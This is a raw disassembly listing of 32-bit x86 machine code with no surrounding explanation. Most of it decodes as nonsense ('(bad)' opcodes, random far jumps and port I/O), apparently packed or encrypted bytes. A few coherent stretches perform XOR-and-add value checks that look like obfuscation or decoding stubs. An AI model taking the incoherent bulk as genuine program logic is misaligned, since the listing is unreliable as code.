  40ab1c:	cmp    BYTE PTR [ecx-0x10],bl
  40ab1f:	dec    ebx
  40ab20:	mov    edx,esp
  40ab22:	sbb    al,0xce
  40ab24:	ret    
  40ab25:	aam    0x75
  40ab27:	xchg   ch,cl
  40ab29:	xor    dh,al
  40ab2b:	push   0x30150324
  40ab30:	jle    0x40ab70
  40ab32:	stos   BYTE PTR es:[edi],al
  40ab33:	sub    DWORD PTR [ebp+0x14],edx
  40ab36:	push   edx
  40ab37:	and    DWORD PTR [esi+0x78],ebx
  40ab3a:	cs call 0xc893:0x6a69eb07
  40ab42:	(bad)  
  40ab43:	xor    DWORD PTR [edx-0x62],esp
  40ab46:	jmp    0x5c32cea1
  40ab4b:	push   esi
  40ab4c:	jmp    0x40ab8a
  40ab4e:	dec    eax
  40ab4f:	jl     0x40ab94
  40ab51:	imul   ebx,DWORD PTR [ebp+0x76],0x9d0e3621
  40ab58:	fsub   DWORD PTR [ecx+0x7e]
  40ab5b:	push   edx
  40ab5c:	imul   esi,DWORD PTR cs:[ebp-0x5d099c39],0xed7fc23
  40ab67:	(bad)  
  40ab68:	es imul ebp,DWORD PTR ds:[ebp-0x4bed4b83],0x55
  40ab71:	cmp    eax,0xf2180264
  40ab76:	and    al,0x73
  40ab78:	dec    ebp
  40ab79:	ret    0xf8fb
  40ab7c:	(bad)  
  40ab7d:	jmp    0x40ab1c
  40ab7f:	and    edx,DWORD PTR [edx]
  40ab81:	push   0x7c7184de
  40ab86:	js     0x40abea
  40ab88:	(bad)  
  40ab89:	gs jbe 0x40abd6
  40ab8c:	mov    ds:0x25cf5c4a,al
  40ab91:	xor    BYTE PTR [edi+0x72],bh
  40ab94:	mov    edx,0xdf5e98a9
  40ab99:	mov    DWORD PTR [ecx+0x390da6e3],esi
  40ab9f:	in     eax,dx
  40aba0:	stos   BYTE PTR es:[edi],al
  40aba1:	out    dx,eax
  40aba2:	mov    es,WORD PTR [ebp+eiz*4-0x4ef187d9]
  40aba9:	mov    WORD PTR [edi],?
  40abab:	jmp    0xc09d5d98
  40abb0:	neg    edx
  40abb2:	mov    esp,0x2ca6706f
  40abb7:	dec    edi
  40abb8:	add    eax,0x838767b0
  40abbd:	lock cwde 
  40abbf:	push   edx
  40abc0:	rcl    BYTE PTR [ecx-0x20ec7096],1
  40abc6:	mov    edi,0xecde6c98
  40abcb:	pop    ecx
  40abcc:	lahf   
  40abcd:	inc    edx
  40abce:	mov    ebx,0xb5df5f97
  40abd3:	pushf  
  40abd4:	xchg   ecx,eax
  40abd5:	(bad)  
  40abd7:	push   0xb5a9343c
  40abdc:	xor    eax,0x3737ca0f
  40abe1:	cmp    DWORD PTR [ebx-0x36ea8924],esi
  40abe7:	imul   esi,DWORD PTR [edi+0x675d059c],0xffffffff
  40abee:	sub    ecx,DWORD PTR [ebp+0x3007b9d]
  40abf4:	imul   ebp,DWORD PTR gs:[ebx+0x34],0xffffffbd
  40abf9:	pushf  
  40abfa:	and    eax,0x464b5833
  40abff:	add    BYTE PTR [edx*1+0x141b5693],dl
  40ac06:	out    0x70,eax
  40ac08:	sub    BYTE PTR [esi],ch
  40ac0a:	push   ebx
  40ac0b:	out    0x5a,eax
  40ac0d:	retf   
  40ac0e:	inc    ecx
  40ac0f:	ss jp  0x40abb7
  40ac12:	adc    eax,0xf4581638
  40ac17:	jge    0x40ac16
  40ac19:	sub    eax,0xc501f17a
  40ac1e:	sbb    al,0x56
  40ac20:	dec    edi
  40ac21:	out    dx,eax
  40ac22:	jne    0x40abbf
  40ac24:	sbb    BYTE PTR [ecx],ah
  40ac26:	adc    DWORD PTR [edx+eax*2-0x3d],0xffffffd3
  40ac2b:	xor    DWORD PTR [esp+eiz*2-0x3c],edi
  40ac2f:	sbb    DWORD PTR [edi+0x42],eax
  40ac32:	mov    eax,ds:0xb99f071d
  40ac37:	add    ah,BYTE PTR [ecx+eax*8+0x74]
  40ac3b:	jmp    0xf784b08b
  40ac40:	mov    ah,0x85
  40ac42:	lods   al,BYTE PTR ds:[esi]
  40ac43:	icebp  
  40ac44:	ret    
  40ac45:	push   ss
  40ac46:	push   0x65bc3d1c
  40ac4b:	fs aaa 
  40ac4d:	fs xchg ebp,eax
  40ac4f:	mov    al,0x97
  40ac51:	mov    eax,0x9c4e8595
  40ac56:	or     al,0xbd
  40ac58:	cmp    esi,ebp
  40ac5a:	sar    DWORD PTR [ecx],cl
  40ac5c:	ins    DWORD PTR es:[edi],dx
  40ac5d:	mov    ch,0xd4
  40ac5f:	mov    al,ds:0xfcf71b7f
  40ac64:	imul   esp,DWORD PTR [edi],0xffffffa3
  40ac67:	add    ah,BYTE PTR [ebx+0x3abcf0a1]
  40ac6d:	jl     0x40ac34
  40ac6f:	sahf   
  40ac70:	out    dx,al
  40ac71:	clc    
  40ac72:	jne    0x40accc
  40ac74:	or     eax,0x8e0912b9
  40ac79:	push   edx
  40ac7a:	xchg   edi,eax
  40ac7b:	dec    edi
  40ac7c:	adc    BYTE PTR [eax+0x74],cl
  40ac7f:	arpl   WORD PTR [eax+0xdbb4f73],si
  40ac85:	xor    al,BYTE PTR [edi+ebp*2]
  40ac88:	repz ror BYTE PTR [edi+0x3934bb4],1
  40ac8f:	stc    
  40ac90:	loopne 0x40ac53
  40ac92:	ds add al,0xb0
  40ac95:	clc    
  40ac96:	add    al,0xb
  40ac98:	cmp    edx,eax
  40ac9a:	cmp    dh,BYTE PTR [esi+0x102407b9]
  40aca0:	ds mov ebx,0x9d205703
  40aca6:	add    eax,0xe67aea0c
  40acab:	xchg   esi,eax
  40acac:	or     al,0x82
  40acae:	add    al,0x3e
  40acb0:	cmp    al,0x25
  40acb2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40acb3:	pushf  
  40acb4:	add    eax,DWORD PTR [ebp+eax*1-0x61]
  40acb8:	fistp  WORD PTR [esi]
  40acba:	mov    ds:0x9cf6a1ac,al
  40acbf:	push   ecx
  40acc0:	lahf   
  40acc1:	adc    esp,DWORD PTR [ecx+ebx*4-0x7c331992]
  40acc8:	mov    ebp,0x2763ecc2
  40accd:	imul   edi,DWORD PTR gs:[edi-0x32],0x7f
  40acd2:	retf   0x400c
  40acd5:	xchg   edx,eax
  40acd6:	or     eax,0xde02aa92
  40acdb:	sub    eax,0xc4654874
  40ace0:	xor    bh,dh
  40ace2:	xor    edx,0xe782f834
  40ace8:	mov    eax,ds:0x819bf194
  40aced:	mov    cl,BYTE PTR [eax+0x3e660ad1]
  40acf3:	adc    ecx,DWORD PTR [edx]
  40acf5:	into   
  40acf6:	mov    ah,0xf8
  40acf8:	adc    al,0xd2
  40acfa:	das    
  40acfb:	add    BYTE PTR [ebp-0x1e],0x92
  40acff:	int3   
  40ad00:	inc    ecx
  40ad01:	pop    ds
  40ad02:	aam    0x73
  40ad04:	daa    
  40ad05:	and    dh,dl
  40ad07:	push   edx
  40ad08:	xor    ecx,esi
  40ad0a:	xchg   DWORD PTR [edx],edi
  40ad0c:	in     al,dx
  40ad0d:	sar    DWORD PTR [ebx+0x79],1
  40ad10:	add    al,0x67
  40ad12:	scas   eax,DWORD PTR es:[edi]
  40ad13:	or     dh,BYTE PTR [ecx]
  40ad15:	xor    eax,0x8e7a5740
  40ad1a:	neg    DWORD PTR [eax+0x1994d2a8]
  40ad20:	ret    
  40ad21:	cwde   
  40ad22:	je     0x40ad84
  40ad24:	lds    eax,FWORD PTR [ebx]
  40ad26:	xchg   esi,eax
  40ad27:	jmp    0xb518:0x6966feed
  40ad2e:	pop    ss
  40ad2f:	inc    edx
  40ad30:	adc    BYTE PTR [ebp-0x36],cl
  40ad33:	lds    esp,FWORD PTR [eax]
  40ad35:	add    cl,BYTE PTR [ecx]
  40ad37:	iret   
  40ad38:	es add eax,ecx
  40ad3b:	mov    ecx,DWORD PTR [ebp-0x8]
  40ad3e:	mov    ecx,DWORD PTR [ecx]
  40ad40:	mov    eax,DWORD PTR [eax+ecx*1]
  40ad43:	mov    DWORD PTR [ebp-0x1c],eax
  40ad46:	mov    eax,DWORD PTR [ebp+0x8]
  40ad49:	xor    eax,esi
  40ad4b:	add    eax,edi
  40ad4d:	mov    DWORD PTR [ebp-0x20],eax
  40ad50:	mov    eax,DWORD PTR [ebp+0x8]
  40ad53:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad56:	xor    eax,esi
  40ad58:	add    eax,edi
  40ad5a:	cmp    ecx,eax
  40ad5c:	je     0x40c082
  40ad62:	mov    eax,DWORD PTR [ebp-0x8]
  40ad65:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ad68:	add    ecx,DWORD PTR [eax]
  40ad6a:	mov    DWORD PTR [ebp-0x20],ecx
  40ad6d:	jmp    0x40b08e
  40ad72:	adc    edx,esi
  40ad74:	inc    ebx
  40ad75:	sahf   
  40ad76:	popa   
  40ad77:	scas   eax,DWORD PTR es:[edi]
  40ad78:	icebp  
  40ad79:	jno    0x40adf2
  40ad7b:	ficomp WORD PTR [edi-0x27f9339]
  40ad81:	inc    edi
  40ad82:	add    bl,dh
  40ad84:	jle    0x40ae04
  40ad86:	jp     0x40ae05
  40ad88:	jle    0x40ae08
  40ad8a:	shl    BYTE PTR [ebx],1
  40ad8c:	jp     0x40adaf
  40ad8e:	push   0xffffffc3
  40ad90:	test   BYTE PTR [edx+0x75],dh
  40ad93:	xchg   esi,eax
  40ad94:	sbb    al,0x82
  40ad96:	imul   edx,DWORD PTR [ebp-0x2d],0xfffffff4
  40ad9a:	mov    bh,0x71
  40ad9c:	aad    0xb0
  40ad9e:	adc    DWORD PTR [ebx+0x59c51ee7],ecx
  40ada4:	rol    al,0xa9
  40ada7:	jecxz  0x40ae10
  40ada9:	xchg   esi,eax
  40adaa:	std    
  40adab:	je     0x40ad69
  40adad:	cmp    al,0x84
  40adaf:	mov    edx,0xeb2c7548
  40adb4:	inc    edi
  40adb5:	push   edi
  40adb6:	lds    edx,FWORD PTR [edx+eax*1]
  40adb9:	jnp    0x40ad91
  40adbb:	out    dx,eax
  40adbc:	xchg   esi,eax
  40adbd:	xchg   ebp,eax
  40adbe:	retf   0x295f
  40adc1:	mov    al,ds:0xeb1cea6a
  40adc6:	pop    ebx
  40adc7:	jp     0x40ae0b
  40adc9:	lahf   
  40adca:	and    DWORD PTR [ebx+0x20],eax
  40adcd:	dec    ebx
  40adce:	or     al,0x1b
  40add0:	adc    ebx,DWORD PTR [ebx]
  40add2:	(bad)  
  40add3:	jo     0x40ad8a
  40add5:	xchg   ebp,eax
  40add6:	or     bh,BYTE PTR [edx+eiz*4]
  40add9:	push   edi
  40adda:	cwde   
  40addb:	pop    edx
  40addc:	adc    BYTE PTR [ebp+0x6276380f],dl
  40ade2:	stos   DWORD PTR es:[edi],eax
  40ade3:	icebp  
  40ade4:	mov    DWORD PTR [edi+0x6e9a5569],ecx
  40adea:	cwde   
  40adeb:	aam    0x99
  40aded:	out    0x3c,eax
  40adef:	inc    esp
  40adf0:	test   edi,edx
  40adf2:	stos   BYTE PTR es:[edi],al
  40adf3:	adc    BYTE PTR [edx],dh
  40adf5:	push   ss
  40adf6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40adf7:	mov    ebp,0x89ec4211
  40adfc:	aam    0xea
  40adfe:	(bad)  
  40adff:	loop   0x40ae64
  40ae01:	sub    dh,dh
  40ae03:	push   0x7f
  40ae05:	push   ecx
  40ae06:	sar    DWORD PTR [ebp+eiz*2-0x79bf898c],cl
  40ae0d:	xchg   esp,eax
  40ae0e:	push   ebx
  40ae0f:	cld    
  40ae10:	add    al,0x47
  40ae13:	pop    esi
  40ae14:	shr    DWORD PTR [ecx],0xd8
  40ae17:	and    ecx,DWORD PTR [eax]
  40ae19:	shl    DWORD PTR [ebx+0x2c],0x5
  40ae1d:	aad    0x20
  40ae1f:	les    ecx,FWORD PTR [edx+0x63]
  40ae22:	shl    BYTE PTR [edi-0x16cbe199],cl
  40ae28:	retf   0x1fc1
  40ae2b:	mov    ch,BYTE PTR [esi+0x2]
  40ae2e:	les    edi,FWORD PTR [esi+ebx*8-0x76891a76]
  40ae35:	xor    DWORD PTR [eax],eax
  40ae37:	imul   ebx,DWORD PTR [ebp+0x3f],0x14b08fc4
  40ae3e:	mov    ah,0xad
  40ae40:	stc    
  40ae41:	stc    
  40ae42:	adc    eax,0xb42ffa45
  40ae47:	ficom  DWORD PTR [ebx]
  40ae49:	(bad)  
  40ae4a:	dec    ebx
  40ae4b:	cmp    eax,0xcbf4c9e2
  40ae50:	inc    ebx
  40ae51:	imul   esp
  40ae53:	xor    al,BYTE PTR [ebx-0x6]
  40ae56:	jnp    0x40ae78
  40ae58:	popf   
  40ae59:	imul   eax,DWORD PTR [eax+0x6f38cda3],0x6b
  40ae60:	mov    edx,?
  40ae62:	mov    edx,0x4903f745
  40ae67:	fcomip st,st(7)
  40ae69:	out    0x29,al
  40ae6b:	push   esi
  40ae6d:	iret   
  40ae6e:	mov    ds:0x61676db0,al
  40ae73:	(bad)  
  40ae74:	repz sar dl,1
  40ae77:	jmp    0x9284e414
  40ae7c:	inc    eax
  40ae7d:	arpl   WORD PTR [ebx+ebp*1+0x2f],sp
  40ae81:	in     al,0x6b
  40ae83:	sub    BYTE PTR [eax],0x5b
  40ae86:	call   0xeaea7083
  40ae8b:	test   BYTE PTR [ebx+0x3d],0x24
  40ae8f:	sbb    DWORD PTR [ecx],edi
  40ae91:	dec    esi
  40ae92:	mov    edx,0x64c77156
  40ae97:	jno    0x40aead
  40ae99:	push   esi
  40ae9a:	cld    
  40ae9b:	jae    0x40ae3b
  40ae9d:	inc    ecx
  40ae9e:	loope  0x40aeff
  40aea0:	adc    eax,0xd8450ad
  40aea5:	adc    al,0xf2
  40aea7:	fwait
  40aea8:	(bad)  
  40aea9:	push   ebx
  40aeaa:	mov    ecx,0x3e5ed365
  40aeaf:	fs mov ebp,0xa26f83e4
  40aeb5:	(bad)  
  40aeb6:	ficom  WORD PTR [ecx+0x22]
  40aeb9:	fist   WORD PTR [eax+0x2d2a32eb]
  40aebf:	dec    edx
  40aec0:	jno    0x40ae9d
  40aec2:	cmp    edx,esp
  40aec4:	mov    esi,0xf0d3a0df
  40aec9:	or     dh,BYTE PTR [ebx-0x3e]
  40aecc:	in     eax,0xe0
  40aece:	dec    ecx
  40aecf:	(bad)  
  40aed0:	jle    0x40aec4
  40aed2:	ror    BYTE PTR [ecx],0x5d
  40aed5:	aaa    
  40aed6:	and    eax,0xf16344d2
  40aedb:	ret    
  40aedc:	sbb    al,0xfd
  40aede:	mov    WORD PTR [ebp+0x4d],cs
  40aee1:	adc    ecx,DWORD PTR [edi+0x5de116b1]
  40aee7:	jns    0x40af2d
  40aee9:	inc    ecx
  40aeea:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40aeeb:	adc    DWORD PTR [ecx-0x3c3c38e],ebx
  40aef1:	mov    bh,0xc0
  40aef3:	sbb    BYTE PTR [esp+ebp*8],bh
  40aef6:	js     0x40aeef
  40aef8:	mov    DWORD PTR [edi+ebx*8],esp
  40aefb:	sub    al,0x7a
  40aefd:	fwait
  40aefe:	cmp    al,0xce
  40af00:	xor    al,0x42
  40af02:	repnz mov ch,0x64
  40af05:	gs icebp 
  40af07:	or     al,0x3d
  40af09:	push   cs
  40af0a:	xchg   ch,bl
  40af0c:	sbb    al,BYTE PTR [ebx-0x5f]
  40af0f:	rol    DWORD PTR [ebx+0xb],cl
  40af12:	fadd   st(2),st
  40af14:	dec    eax
  40af15:	mov    edi,0xa8ec1a35
  40af1a:	dec    eax
  40af1b:	or     al,0xb0
  40af1d:	out    dx,eax
  40af1e:	lods   al,BYTE PTR ds:[esi]
  40af1f:	clc    
  40af20:	rol    BYTE PTR [ebx],1
  40af22:	or     al,BYTE PTR [edx-0x2d398cf]
  40af28:	inc    ebx
  40af29:	les    ebp,FWORD PTR [ebx-0x3d]
  40af2c:	mov    edi,DWORD PTR [esi-0x41]
  40af2f:	nop
  40af30:	fidiv  DWORD PTR gs:[eax]
  40af33:	mov    ebp,0xb4dc6080
  40af38:	int3   
  40af39:	add    al,0xbb
  40af3b:	or     dl,BYTE PTR [edx-0x5f]
  40af3e:	mov    DWORD PTR [edx-0x7d],ebp
  40af41:	mov    cl,0x9f
  40af43:	xchg   edi,eax
  40af44:	jnp    0x40afa2
  40af46:	pop    ecx
  40af47:	cmp    al,0x14
  40af49:	dec    esi
  40af4a:	mov    edx,0x291088c
  40af4f:	sar    BYTE PTR [edx-0x41cba1a6],0x1f
  40af56:	lock fisub DWORD PTR [eax+0x34ae68c7]
  40af5d:	test   DWORD PTR [ecx+0x2f83e978],eax
  40af63:	stos   DWORD PTR es:[edi],eax
  40af64:	adc    ebx,DWORD PTR [ebp+esi*4-0x69]
  40af68:	js     0x40afdc
  40af6a:	cmp    BYTE PTR [esi+esi*8],0xbb
  40af6e:	push   ecx
  40af6f:	mov    ds:0x2d01e474,al
  40af74:	popa   
  40af75:	push   0xffffff9a
  40af77:	pop    esp
  40af78:	loopne 0x40af70
  40af7a:	aam    0x18
  40af7c:	pop    esp
  40af7d:	retf   
  40af7e:	inc    esp
  40af7f:	mov    BYTE PTR [edi],ah
  40af81:	jle    0x40afd6
  40af83:	mov    ds:0x2f5c6056,al
  40af88:	dec    ecx
  40af89:	xor    al,0xf1
  40af8b:	in     eax,0x1d
  40af8d:	repnz cmp ebx,DWORD PTR [ebp+ebp*8+0x25]
  40af92:	inc    eax
  40af93:	add    BYTE PTR [esi+ebx*4+0x3e],cl
  40af97:	dec    eax
  40af98:	mov    ecx,0xb87de0c1
  40af9d:	mov    al,0xc5
  40af9f:	pop    esp
  40afa0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40afa1:	xchg   ecx,eax
  40afa2:	push   edi
  40afa3:	ins    BYTE PTR es:[edi],dx
  40afa4:	fistp  WORD PTR [esi+0x3b]
  40afa7:	mov    ds:0x61420e0f,al
  40afac:	ins    DWORD PTR es:[edi],dx
  40afad:	sub    cl,ch
  40afaf:	daa    
  40afb0:	add    eax,0x8785cbd6
  40afb5:	push   esi
  40afb6:	aaa    
  40afb7:	popf   
  40afb8:	fs inc edx
  40afba:	int    0xe2
  40afbc:	dec    di
  40afbe:	cmp    al,0x25
  40afc0:	sbb    edi,DWORD PTR ds:0xa044ba36
  40afc6:	repz cmp ebp,DWORD PTR [ebp+edi*2-0x6f1e7d2e]
  40afce:	inc    eax
  40afcf:	xor    al,0x3a
  40afd1:	cld    
  40afd2:	inc    edx
  40afd3:	add    ah,BYTE PTR [esi]
  40afd5:	pop    ds
  40afd6:	pop    ss
  40afd7:	int3   
  40afd8:	pop    ecx
  40afd9:	push   0xae713f6
  40afde:	ds out 0x64,al
  40afe1:	jbe    0x40b042
  40afe3:	pushf  
  40afe4:	add    DWORD PTR [ecx],ebp
  40afe6:	sbb    DWORD PTR [ecx+0x57615057],ebp
  40afec:	call   0x67a0e372
  40aff1:	jl     0x40afbd
  40aff3:	rol    BYTE PTR [edi],1
  40aff5:	fs fprem 
  40aff8:	mov    esi,0x2c89c1be
  40affd:	push   edx
  40affe:	push   ecx
  40afff:	mov    ?,WORD PTR [esi-0x43]
  40b002:	loopne 0x40b050
  40b004:	push   esi
  40b005:	call   0x1b03:0xf5da4a72
  40b00c:	xchg   BYTE PTR [ebp+0xc],al
  40b00f:	cmp    DWORD PTR [ebp-0x5ed988f3],edx
  40b015:	ins    BYTE PTR es:[edi],dx
  40b016:	test   eax,0xb00d5f21
  40b01b:	add    edi,DWORD PTR [eax+ebx*8+0x6b]
  40b01f:	sub    eax,ebx
  40b021:	inc    ecx
  40b022:	fsubp  st(5),st
  40b024:	test   eax,0x22363a9f
  40b029:	lods   al,BYTE PTR ds:[esi]
  40b02a:	push   0x262cdef6
  40b02f:	leave  
  40b030:	out    0xe,eax
  40b032:	mov    ecx,0x70ee85e8
  40b037:	test   DWORD PTR [edx],esp
  40b039:	push   DWORD PTR [esi+0x39]
  40b03c:	push   ebp
  40b03d:	jo     0x40b075
  40b03f:	jl     0x40aff4
  40b041:	je     0x40b093
  40b043:	popa   
  40b044:	cmp    al,BYTE PTR [edi+0x3e]
  40b047:	fwait
  40b048:	mov    eax,0x6d600252
  40b04d:	jne    0x40b0ca
  40b04f:	ja     0x40b070
  40b051:	jmp    0x40b05f
  40b053:	inc    ebp
  40b054:	inc    ebp
  40b055:	jmp    0x20a68e44
  40b05a:	(bad)  
  40b05b:	jns    0x40b017
  40b05d:	(bad)  
  40b05e:	sbb    al,0xd7
  40b060:	cmp    eax,0xaf20e43d
  40b065:	sub    BYTE PTR [edi-0x45],ch
  40b068:	adc    eax,DWORD PTR [esi-0x59]
  40b06b:	call   0xc110:0x34d8cea6
  40b072:	sti    
  40b073:	add    dl,BYTE PTR [ebp-0x49f30765]
  40b079:	retf   0xa963
  40b07c:	xor    DWORD PTR [esi-0x16],0xffffffb4
  40b080:	stos   BYTE PTR es:[edi],al
  40b081:	cdq    
  40b082:	jecxz  0x40b057
  40b084:	addr16 mov al,ds:0x8a9e
  40b088:	mov    dh,0x9d
  40b08a:	pusha  
  40b08b:	in     eax,dx
  40b08c:	ret    0x8b7c
  40b08f:	inc    ebp
  40b090:	loopne 0x40b01d
  40b092:	dec    ebp
  40b093:	clc    
  40b094:	mov    eax,DWORD PTR [eax+0xc]
  40b097:	mov    ecx,DWORD PTR [ecx]
  40b099:	mov    al,BYTE PTR [eax+ecx*1]
  40b09c:	add    al,0x38
  40b09e:	xor    al,0x46
  40b0a0:	cmp    al,0xc5
  40b0a2:	je     0x40b6fb
  40b0a8:	jmp    0x40b3c9
  40b0ad:	sar    DWORD PTR [ecx],1
  40b0af:	mov    cl,0xa4
  40b0b1:	mov    cl,0x74
  40b0b3:	shr    DWORD PTR [ecx+0x55],1
  40b0b6:	fsubr  DWORD PTR [eax+0x37]
  40b0b9:	(bad)
  40b0bd:	or     al,0xfe
  40b0bf:	jle    0x40b13f
  40b0c1:	jp     0x40b140
  40b0c3:	jle    0x40b143
  40b0c5:	inc    BYTE PTR [edx+0x48]
  40b0c8:	pop    ecx
  40b0c9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b0ca:	dec    edx
  40b0cb:	stos   DWORD PTR es:[edi],eax
  40b0cc:	xchg   BYTE PTR [ecx],bl
  40b0ce:	dec    edi
  40b0cf:	jnp    0x40b0e0
  40b0d1:	or     al,0x7b
  40b0d3:	das    
  40b0d4:	inc    edx
  40b0d5:	fwait
  40b0d6:	inc    ecx
  40b0d7:	loop   0x40b0b0
  40b0d9:	ret    
  40b0da:	push   cs
  40b0db:	or     esi,eax
  40b0dd:	xor    ecx,edx
  40b0df:	sbb    eax,0xdecdca64
  40b0e4:	xor    DWORD PTR [ecx],0x7f
  40b0e7:	mov    DWORD PTR [eax],esi
  40b0e9:	xor    BYTE PTR [eax-0x7aa63c9a],bl
  40b0ef:	cmp    eax,0x4f55a8c9
  40b0f4:	inc    ecx
  40b0f5:	adc    DWORD PTR [eax+esi*1+0x3a],ebp
  40b0f9:	push   es
  40b0fa:	aad    0x12
  40b0fc:	push   ds
  40b0fd:	pusha  
  40b0fe:	fisub  DWORD PTR [edi+0x6a0ce42c]
  40b104:	xlat   BYTE PTR ds:[ebx]
  40b105:	stos   DWORD PTR es:[edi],eax
  40b106:	call   0xedfc494f
  40b10b:	out    0x87,eax
  40b10d:	xor    eax,0x670c03be
  40b112:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b113:	xchg   edi,eax
  40b114:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b115:	xor    bh,BYTE PTR ds:0x6c7b648e
  40b11b:	pop    esp
  40b11c:	gs retf 0x8064
  40b120:	mov    gs,ecx
  40b122:	rcr    bl,0x78
  40b125:	aad    0x3a
  40b127:	das    
  40b128:	data16 lods al,BYTE PTR ds:[esi]
  40b12a:	adc    DWORD PTR [eax+ebp*2-0x80c21f3],edx
  40b131:	nop
  40b132:	(bad)  
  40b134:	or     edx,ebx
  40b136:	loopne 0x40b1a8
  40b138:	mov    cl,0xbd
  40b13a:	sub    eax,0x821fa914
  40b13f:	addr16 mov ecx,0x1936f183
  40b145:	mov    bh,0xcd
  40b147:	mov    ds:0xfaf5926e,eax
  40b14c:	mov    bl,0x8d
  40b14e:	aad    0x62
  40b150:	jle    0x40b0f0
  40b152:	aas    
  40b153:	ja     0x40b189
  40b155:	outs   dx,DWORD PTR ds:[esi]
  40b156:	mov    esp,0x53b9ed93
  40b15b:	pop    edx
  40b15c:	cwde   
  40b15d:	or     DWORD PTR [ebp+0x3b],edi
  40b160:	ss popa 
  40b162:	leave  
  40b163:	cs add eax,0xc59f9fb4
  40b169:	jge    0x40b191
  40b16b:	rcl    BYTE PTR [edi+ecx*2+0x21],1
  40b16f:	cmp    DWORD PTR [edx-0x16],edx
  40b172:	(bad)  
  40b173:	shr    BYTE PTR [esi+0x13dc5fff],1
  40b179:	dec    ecx
  40b17a:	inc    edi
  40b17b:	pusha  
  40b17c:	xor    eax,0xc83c821a
  40b181:	nop
  40b182:	sub    dl,BYTE PTR [edx-0x3d66c7bc]
  40b188:	push   esp
  40b189:	xlat   BYTE PTR ds:[ebx]
  40b18a:	ins    DWORD PTR es:[edi],dx
  40b18b:	dec    eax
  40b18c:	push   es
  40b18d:	fisttp WORD PTR [eax-0x67]
  40b190:	test   al,0x4b
  40b192:	adc    dl,BYTE PTR [edi+0x3fde7400]
  40b198:	add    BYTE PTR ds:[ecx-0x4f],0x6a
  40b19d:	mov    ah,0x29
  40b19f:	lods   eax,DWORD PTR ds:[esi]
  40b1a0:	gs sti 
  40b1a2:	aam    0x77
  40b1a4:	cdq    
  40b1a5:	mov    eax,ds:0x221fecdc
  40b1aa:	xor    cl,BYTE PTR [ecx]
  40b1ac:	xor    eax,0x5b19fc0c
  40b1b1:	mov    edx,0xd08aa5b3
  40b1b6:	ins    DWORD PTR es:[edi],dx
  40b1b7:	popf   
  40b1b8:	mov    DWORD PTR ds:0x608cb9fb,ebp
  40b1be:	or     al,0x42
  40b1c0:	or     cl,BYTE PTR [edi-0x5494d814]
  40b1c6:	adc    DWORD PTR [eax+0x7],0x65ef21e
  40b1cd:	jge    0x40b1b3
  40b1cf:	xchg   ebx,eax
  40b1d0:	dec    ecx
  40b1d1:	and    BYTE PTR [edx],dh
  40b1d3:	adc    edx,edi
  40b1d5:	add    esi,ecx
  40b1d7:	lods   al,BYTE PTR ds:[esi]
  40b1d8:	jg     0x40b175
  40b1da:	aad    0xb8
  40b1dc:	sbb    dh,0xb4
  40b1df:	mov    ch,BYTE PTR [ebx]
  40b1e1:	sub    ebp,DWORD PTR [edx-0x2c]
  40b1e4:	jmp    0x40b1d0
  40b1e6:	pop    ss
  40b1e7:	jns    0x40b20e
  40b1e9:	test   BYTE PTR [edi+0x3cf18081],bl
  40b1ef:	scas   al,BYTE PTR es:[edi]
  40b1f0:	aad    0xee
  40b1f2:	inc    ebx
  40b1f3:	push   0x4129e119
  40b1f8:	adc    di,di
  40b1fb:	inc    ebp
  40b1fc:	call   0x8aa6:0xb757d1f1
  40b203:	push   esp
  40b204:	mov    edx,0xac2a0842
  40b209:	mov    ebx,0x2b5e3b4c
  40b20e:	shl    DWORD PTR [edx+0xc8cac1f],cl
  40b214:	enter  0xacad,0xe3
  40b218:	(bad)  
  40b219:	and    ecx,DWORD PTR [eax+0x4f]
  40b21c:	inc    esp
  40b21d:	and    dl,al
  40b21f:	mov    cl,0xa3
  40b221:	sahf   
  40b222:	and    DWORD PTR [esi+ebp*4-0x7c404198],eax
  40b229:	add    al,0x6d
  40b22b:	icebp  
  40b22c:	xor    al,0xf7
  40b22e:	and    ebp,DWORD PTR [ecx-0x68c9ad9f]
  40b234:	dec    ebx
  40b235:	mov    dh,0xfc
  40b237:	ins    DWORD PTR es:[edi],dx
  40b238:	jg     0x40b1cd
  40b23a:	mov    dl,0x46
  40b23c:	ins    BYTE PTR es:[edi],dx
  40b23d:	pop    ebx
  40b23e:	test   dh,bl
  40b240:	xor    eax,0x11739c4e
  40b245:	leave  
  40b246:	sub    BYTE PTR [esi],0x23
  40b249:	cmp    ecx,DWORD PTR [edx-0xd]
  40b24c:	pop    esp
  40b24d:	fmul   DWORD PTR [edi+ebp*1+0x79]
  40b251:	mov    cl,0x17
  40b253:	test   ecx,ebx
  40b255:	arpl   si,si
  40b257:	fsubr  QWORD PTR [ecx-0x6aa8ab61]
  40b25d:	push   edi
  40b25e:	aam    0xf
  40b260:	loop   0x40b215
  40b262:	fucom  st(1)
  40b264:	jg     0x40b25e
  40b266:	test   al,0x99
  40b268:	cmp    ecx,ebp
  40b26a:	sub    edi,DWORD PTR [ebx+0x0]
  40b26d:	fmul   DWORD PTR [eax-0x176dc2d]
  40b273:	cdq    
  40b274:	add    BYTE PTR [ebx-0x5f],0xe3
  40b278:	and    DWORD PTR gs:[edi],eax
  40b27b:	outs   dx,BYTE PTR ds:[esi]
  40b27c:	in     al,0x11
  40b27e:	jno    0x40b2c1
  40b280:	loopne 0x40b262
  40b282:	mov    esi,edi
  40b284:	jp     0x40b232
  40b286:	push   ds
  40b287:	or     ch,ah
  40b289:	int    0x68
  40b28b:	jecxz  0x40b265
  40b28d:	mov    al,0xe4
  40b28f:	call   0x126e:0x5d6892aa
  40b296:	push   ebp
  40b297:	sub    al,0xf2
  40b299:	push   esi
  40b29a:	cs push ebx
  40b29c:	dec    edi
  40b29d:	enter  0x8a40,0x71
  40b2a1:	dec    edx
  40b2a2:	push   ebp
  40b2a3:	xchg   ebx,eax
  40b2a4:	(bad)  
  40b2a6:	pop    eax
  40b2a7:	or     DWORD PTR [edi-0x67],esp
  40b2aa:	inc    ebx
  40b2ab:	inc    ebx
